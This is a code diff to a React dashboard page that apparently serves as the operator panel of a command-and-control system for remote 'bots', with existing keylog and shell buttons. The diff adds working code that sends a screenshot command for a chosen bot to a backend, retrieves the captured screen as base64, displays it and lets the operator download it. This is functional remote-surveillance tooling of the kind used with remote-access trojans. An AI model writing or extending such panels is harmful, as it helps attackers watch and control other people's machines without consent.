@@ -32,6 +32,12 @@ export default function AgentsAndFleetPage() {
   // Mock agent data
   const [agents, setAgents] = useState<Agent[]>([]);
   const [loadingAgents, setLoadingAgents] = useState(false);
+  const [screenshotModal, setScreenshotModal] = useState<{isOpen: boolean, botUuid: string, screenshotData: string | null}>({
+    isOpen: false,
+    botUuid: '',
+    screenshotData: null
+  });
+  const [loadingScreenshot, setLoadingScreenshot] = useState(false);
 
   useEffect(() => {
     // Check if user is logged in via cookies
@@ -88,8 +94,84 @@ export default function AgentsAndFleetPage() {
     console.log('Exporting agent list');
   };
 
-  const handleAgentAction = (agentUuid: string, action: string) => {
-    console.log(`Executing ${action} on agent ${agentUuid}`);
+  const handleAgentAction = async (agentUuid: string, action: string) => {
+    if (action === 'screenshot') {
+      await takeScreenshot(agentUuid);
+    } else {
+      console.log(`Executing ${action} on agent ${agentUuid}`);
+    }
+  };
+
+  const takeScreenshot = async (botUuid: string) => {
+    setLoadingScreenshot(true);
+    try {
+      // Send screenshot command to backend
+      const response = await fetch('http://localhost:5000/screenshot', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          bot_uuid: botUuid,
+          username: user?.username || 'admin'
+        }),
+      });
+
+      if (response.ok) {
+        const result = await response.json();
+        if (result.status === 'success') {
+          // Wait a moment for the bot to execute the command
+          await new Promise(resolve => setTimeout(resolve, 3000));
+          
+          // Get the results
+          await getScreenshotResults(botUuid);
+        } else {
+          alert(`Error: ${result.message}`);
+        }
+      } else {
+        alert('Failed to send screenshot command');
+      }
+    } catch (error) {
+      console.error('Error taking screenshot:', error);
+      alert('Error taking screenshot');
+    } finally {
+      setLoadingScreenshot(false);
+    }
+  };
+
+  const getScreenshotResults = async (botUuid: string) => {
+    try {
+      const response = await fetch(`http://localhost:5000/get-results?bot_uuid=${botUuid}&username=${user?.username || 'admin'}`, {
+        method: 'GET',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+      });
+
+      if (response.ok) {
+        const result = await response.json();
+        if (result.status === 'success' && result.results) {
+          // Check if the result contains base64 image data
+          const results = result.results.trim();
+          if (results && results.length > 100) { // Base64 images are typically long
+            setScreenshotModal({
+              isOpen: true,
+              botUuid: botUuid,
+              screenshotData: results
+            });
+          } else {
+            alert('No screenshot data received. The bot may not be online or may have encountered an error.');
+          }
+        } else {
+          alert('No screenshot results available');
+        }
+      } else {
+        alert('Failed to get screenshot results');
+      }
+    } catch (error) {
+      console.error('Error getting screenshot results:', error);
+      alert('Error getting screenshot results');
+    }
   };
 
   const accessShell = (agentUuid: string) => {
@@ -269,9 +351,14 @@ export default function AgentsAndFleetPage() {
                   </button>
                   <button
                     onClick={() => handleAgentAction(agent.uuid, 'screenshot')}
-                    className="bg-blue-600 hover:bg-blue-700 text-white px-3 py-2 rounded font-mono text-xs transition-colors"
+                    disabled={loadingScreenshot}
+                    className={`px-3 py-2 rounded font-mono text-xs transition-colors ${
+                      loadingScreenshot 
+                        ? 'bg-gray-600 text-gray-400 cursor-not-allowed' 
+                        : 'bg-blue-600 hover:bg-blue-700 text-white'
+                    }`}
                   >
-                    📸 Screenshot
+                    {loadingScreenshot ? '⏳ Capturing...' : '📸 Screenshot'}
                   </button>
                   <button
                     onClick={() => handleAgentAction(agent.uuid, 'keylog')}
@@ -329,9 +416,14 @@ export default function AgentsAndFleetPage() {
                         </button>
                         <button
                           onClick={() => handleAgentAction(agent.uuid, 'screenshot')}
-                          className="bg-blue-600 hover:bg-blue-700 text-white px-2 py-1 rounded text-xs font-mono transition-colors"
+                          disabled={loadingScreenshot}
+                          className={`px-2 py-1 rounded text-xs font-mono transition-colors ${
+                            loadingScreenshot 
+                              ? 'bg-gray-600 text-gray-400 cursor-not-allowed' 
+                              : 'bg-blue-600 hover:bg-blue-700 text-white'
+                          }`}
                         >
-                          📸
+                          {loadingScreenshot ? '⏳' : '📸'}
                         </button>
                         <button
                           onClick={() => handleAgentAction(agent.uuid, 'keylog')}
@@ -359,6 +451,94 @@ export default function AgentsAndFleetPage() {
           <div className="text-center py-12">
             <div className="text-gray-400 text-lg font-mono">No agents found matching your criteria</div>
             <div className="text-gray-500 text-sm font-mono mt-2">Try adjusting your search or filters</div>
+          </div>
+        )}
+
+        {/* Screenshot Modal */}
+        {screenshotModal.isOpen && (
+          <div className="fixed inset-0 bg-black bg-opacity-75 flex items-center justify-center z-50">
+            <div className="bg-gray-900 rounded-lg p-6 max-w-4xl max-h-[90vh] overflow-auto border border-gray-700">
+              <div className="flex items-center justify-between mb-4">
+                <h3 className="text-xl font-mono font-bold text-green-400">
+                  Screenshot - {screenshotModal.botUuid}
+                </h3>
+                <button
+                  onClick={() => setScreenshotModal({isOpen: false, botUuid: '', screenshotData: null})}
+                  className="text-gray-400 hover:text-white text-2xl font-bold"
+                >
+                  ×
+                </button>
+              </div>
+              
+              {screenshotModal.screenshotData ? (
+                <div className="space-y-4">
+                  <img
+                    src={`data:image/png;base64,${screenshotModal.screenshotData}`}
+                    alt="Screenshot"
+                    className="max-w-full h-auto border border-gray-600 rounded"
+                  />
+                  <div className="flex justify-between items-center">
+                    <span className="text-gray-400 font-mono text-sm">
+                      Captured at: {new Date().toLocaleString()}
+                    </span>
+                    <div className="space-x-2">
+                      <button
+                        onClick={() => {
+                          try {
+                            // Create a blob from the base64 data
+                            const byteCharacters = atob(screenshotModal.screenshotData!);
+                            const byteNumbers = new Array(byteCharacters.length);
+                            for (let i = 0; i < byteCharacters.length; i++) {
+                              byteNumbers[i] = byteCharacters.charCodeAt(i);
+                            }
+                            const byteArray = new Uint8Array(byteNumbers);
+                            const blob = new Blob([byteArray], { type: 'image/png' });
+                            
+                            // Create download link
+                            const url = window.URL.createObjectURL(blob);
+                            const link = document.createElement('a');
+                            link.href = url;
+                            link.download = `screenshot-${screenshotModal.botUuid}-${Date.now()}.png`;
+                            document.body.appendChild(link);
+                            link.click();
+                            document.body.removeChild(link);
+                            window.URL.revokeObjectURL(url);
+                          } catch (error) {
+                            console.error('Download failed:', error);
+                            alert('Download failed. Please try again.');
+                          }
+                        }}
+                        className="bg-green-600 hover:bg-green-700 text-white px-4 py-2 rounded font-mono text-sm transition-colors"
+                      >
+                        Download
+                      </button>
+                      <button
+                        onClick={() => setScreenshotModal({isOpen: false, botUuid: '', screenshotData: null})}
+                        className="bg-gray-600 hover:bg-gray-700 text-white px-4 py-2 rounded font-mono text-sm transition-colors"
+                      >
+                        Close
+                      </button>
+                    </div>
+                  </div>
+                </div>
+              ) : (
+                <div className="text-center py-8">
+                  <div className="text-gray-400 font-mono">No screenshot data available</div>
+                </div>
+              )}
+            </div>
+          </div>
+        )}
+
+        {/* Loading Overlay for Screenshot */}
+        {loadingScreenshot && (
+          <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-40">
+            <div className="bg-gray-900 rounded-lg p-6 border border-gray-700">
+              <div className="text-center">
+                <div className="text-green-400 font-mono text-lg mb-2">Taking Screenshot...</div>
+                <div className="text-gray-400 font-mono text-sm">Please wait while the bot captures the screen</div>
+              </div>
+            </div>
           </div>
         )}
       </main>
